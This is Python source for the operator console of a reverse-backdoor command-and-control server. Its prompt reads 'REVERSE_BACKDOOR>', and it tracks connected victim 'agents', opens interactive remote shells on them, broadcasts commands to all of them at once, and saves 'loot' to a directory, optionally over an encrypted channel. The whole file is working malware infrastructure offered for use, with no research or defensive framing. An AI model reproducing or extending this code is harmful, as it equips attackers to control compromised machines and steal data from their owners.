from server.core.agent_registry import AgentRegistry
from server.commands import build_server_router
from server.commands.base import ServerSessionContext
from server.ui.prompt import print_colored


def _build_protocol(sock, encryption):
    if encryption:
        from server.core.encrypted_protocol import EncryptedProtocol
        proto = EncryptedProtocol(sock)
        proto.perform_key_exchange()
        return proto
    from server.core.protocol import Protocol
    return Protocol(sock)


def run_session(sock, ip, loot_dir, encryption=False):
    protocol = _build_protocol(sock, encryption)
    registry = AgentRegistry()
    agent_id = registry.register(sock, ip)

    try:
        ctx = ServerSessionContext(
            sock=sock,
            protocol=protocol,
            ip=ip,
            loot_dir=loot_dir,
        )
        router = build_server_router()
        agent_shell(router, ctx, agent_id)
    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        registry.unregister(agent_id)
        print_colored(f'[*] {agent_id} ({ip}) disconnected', 'yellow')
        try:
            sock.close()
        except Exception:
            pass


def agent_shell(router, ctx, agent_id):
    while True:
        try:
            command = input(f'* {agent_id}~{ctx.ip}: ').strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not command:
            continue

        if command == 'background':
            print_colored(f'[+] {agent_id} backgrounded', 'cyan')
            return

        result = router.dispatch(ctx, command)
        if result is False:
            break
        if result is True:
            continue

        ctx.protocol.send(command)
        try:
            response = ctx.protocol.recv()
            print(response)
        except KeyboardInterrupt:
            ctx.protocol.send('terminate')
            print_colored('\n[-] Command Terminated', 'yellow')
            ctx.protocol.drain(1.0)
        except (ConnectionError, BrokenPipeError, OSError):
            print_colored('[-] Connection lost', 'red')
            break


def run_master_loop(loot_dir, encryption=False):
    registry = AgentRegistry()
    print_colored('[+] Type \'agents\' to list, \'interact <id>\' to connect, \'broadcast <cmd>\' to spam', 'cyan')

    while True:
        try:
            command = input('REVERSE_BACKDOOR> ').strip()
        except (EOFError, KeyboardInterrupt):
            print_colored('\n[*] Shutting down...', 'yellow')
            break

        if not command:
            continue

        if command == 'exit' or command == 'quit':
            break

        if command == 'agents':
            agents = registry.list_all()
            if not agents:
                print_colored('[-] No agents connected', 'yellow')
            else:
                for aid, info in agents.items():
                    print_colored(
                        f'  {info.agent_id}  {info.ip}  (connected: {info.connected_at})',
                        'cyan',
                    )
            continue

        if command.startswith('interact '):
            target_id = command[9:].strip()
            info = registry.get(target_id)
            if info is None:
                print_colored(f'[-] Agent \'{target_id}\' not found', 'red')
                continue
            protocol = _build_protocol(info.sock, encryption)
            print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')
            ctx = ServerSessionContext(
                sock=info.sock,
                protocol=protocol,
                ip=info.ip,
                loot_dir=loot_dir,
            )
            router = build_server_router()
            agent_shell(router, ctx, target_id)
            continue

        if command.startswith('broadcast '):
            cmd = command[10:].strip()
            registry.broadcast(cmd)
            print_colored(f'[+] Broadcast sent: {cmd}', 'green')
            continue

        if command == 'help':
            print_colored('''
  Manager Commands:
    agents                    List connected agents
    interact <agent-id>       Enter interactive shell with an agent
    broadcast <cmd>           Send command to all agents
    exit / quit               Shutdown server
''', 'cyan')
            continue

        print_colored('[-] Unknown command. Type \'help\' for available commands.', 'red')
